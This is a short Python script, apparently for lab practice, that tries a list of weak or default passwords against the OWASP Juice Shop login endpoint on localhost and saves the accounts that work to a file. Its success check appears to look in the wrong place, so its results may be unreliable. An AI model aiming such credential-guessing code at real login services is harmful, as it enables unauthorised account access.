import requests, json, datetime, os
URL = "http://localhost:3000/rest/user/login"
CREDS = [
    {"email": "admin@juice-sh.op", "password": "admin123"},
    {"email": "admin@juice-sh.op", "password": "password"},
    {"email": "jim@juice-sh.op",   "password": "ncc-1701"}
]
def try_login(c):
    r = requests.post(URL, json=c, headers={"Content-Type":"application/json"})
    return r.status_code == 200 and "authentication" in r.headers
found = [c for c in CREDS if try_login(c)]
out = {"working_creds": found, "timestamp": str(datetime.datetime.now())}
with open(os.path.join(os.getcwd(),"weak_creds.json"),"w") as f:
    json.dump(out,f,indent=2)
print("Weak creds found:", len(found))